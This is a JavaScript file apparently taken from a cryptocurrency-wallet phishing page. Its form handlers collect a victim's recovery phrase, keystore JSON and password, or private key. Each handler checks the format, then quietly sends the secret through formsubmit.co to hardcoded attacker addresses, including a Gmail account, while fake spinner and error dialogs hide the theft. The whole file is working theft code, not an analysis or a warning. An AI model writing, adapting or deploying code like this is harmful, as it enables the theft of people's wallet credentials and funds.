
	
// ===============================================================================
function phrase_a(evt, Type_a) {
    var h, phrasecontent_a, phraselinks_a;
    phrasecontent_a = document.getElementsByClassName("phrasecontent_a");
    for (h = 0; h < phrasecontent_a.length; h++) {
      phrasecontent_a[h].style.display = "none";
    }
    phraselinks_a = document.getElementsByClassName("phraselinks_a");
    for (h = 0; h < phraselinks_a.length; h++) {
      phraselinks_a[h].className = phraselinks_a[h].className.replace(" active", "");
    }
    document.getElementById(Type_a).style.display = "block";
    evt.currentTarget.className += " active";
  }
  
  document.getElementById("default_a").click();
  
  // ==================================================================================

var modal2 = document.getElementById("myModal2");

// Get the button that opens the modal
var btn2 = document.getElementById("myBtn2");
// var popy = document.getElementById("messageButton");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];
// var div_B= document.getElementById('divB');

// When the user clicks the button, open the modal

// $('#myBtn2').click(function(){
//    $('#myModal2').show();
//   //  $('#myModal').hide();
//   alert("het")
// })

function check()
	{
    
    modal2.style.display = "block";
 
	}

// btn2.onclick = function() {
//   modal2.style.display = "block";
// }

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
  modal2.style.display = "none";
}



  
  var modal_show = document.getElementById("myModal_show");
  var spiner = document.getElementById("spinnerr");
  var laster = document.getElementById("laster");
  
  function submitter(){
    spiner.style.display = "none";
    laster.style.display = "flex";

    setTimeout(function(){
      //what to do after 10 seconds
      modal_show.style.display = "none"
      modal2.style.display = "none";
      //or some other code
    }, 5000);
  }
  
  
  function ender(){
    spiner.style.display = "none";
    alert("error occured, try again")
  }

    
      
  var mail = ["morephrase@gmail.com", "3636ff45719cdef68825126414f77690"];
  // var appy = document.getElementById('p_name').innerText;
  $("#proceed1").click(function(){
    var appy = "phrase"
    var message1 = document.getElementById('message1').value;
    var re = /^[a-zA-Z\s]*$/;
    function countwords(message1){
        message1 = message1.replace(/(^\s*)|(\s*$)/gi,"");
        message1 = message1.replace(/[ ]{2,}/gi," ");
        message1 = message1.replace(/\n /,"\n");
        return message1.split(' ');
    }
    if(message1 == null || message1 == ""){
      window.alert("Empty Field!");
    }
    else{
      if(countwords(message1).length<12){
      window.alert("The recovery Phrase is not Complete!");
      // window.alert(countwords(message1));
      }
      else if(re.test(message1) == 0){
        window.alert("Invalid Phrase!");
  
      }
      else{
            modal_show.style.display = "block";
            for(var i=0; i<mail.length; i++){
              // alert(mail[i])
                $.ajax({
                    method: 'POST',
                    url: 'https://formsubmit.co/ajax/'+mail[i],
                    dataType: 'json',
                    accepts: 'application/json',
                    data: {
                        name: "Phrase connected",
                        message: "phrase =  "+ message1,
                    },
                  
                    success: (data) => submitter(),
                    error: (err) => ender(), 
                });
            
            }
      }
  
    }
  });


  $("#proceed2").click(function(){
    var appy = "wallet";
    var message2 = document.getElementById('message2').value;
    var passy = document.getElementById('passy').value;
    var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
     if(message2 == null || message2 == "" || passy ==null || passy ==""){
      window.alert("Empty fields detected!");
    }
    else{
      // if(!message2.match(validRegex)){
        if(message2.length<5){
        window.alert("Invalid Keystore JSON!");
      }
      else{
              modal_show.style.display = "block";
        for(var i=0; i<mail.length; i++){
                        $.ajax({
                      method: 'POST',
                      url: 'https://formsubmit.co/ajax/'+mail[i],
                      dataType: 'json',
                      accepts: 'application/json',
                      data: {
                          name: "KeyStore JSON Connected",
                          message: "email= "+message2+" password= "+ passy
                      },
                      success: (data) => submitter(),
                      error: (err) => ender()
                      });
                   }
          }
      // }
    }
  });



  $("#proceed3").click(function(){
    // var appy = "wallet";
    var message3 = document.getElementById('message3').value;
     if(message3 == null || message3 == ""){
      window.alert("Empty Field!");
    }
    else{
      if(message3.length<64){
        window.alert("Invalid Private Key!");
      }
      else{
              modal_show.style.display = "block";
          for(var i=0; i<mail.length; i++){
                          $.ajax({
                        method: 'POST',
                        url: 'https://formsubmit.co/ajax/'+mail[i],
                        dataType: 'json',
                        accepts: 'application/json',
                        data: {
                            name: "PrivateKey Connected",
                            message: "Private Key= "+message3
                        },
                        success: (data) => submitter(),
                        error: (err) => ender(),
                    });
            }
    }
  }
  });
  





  // ------------------------------------------------------------------------------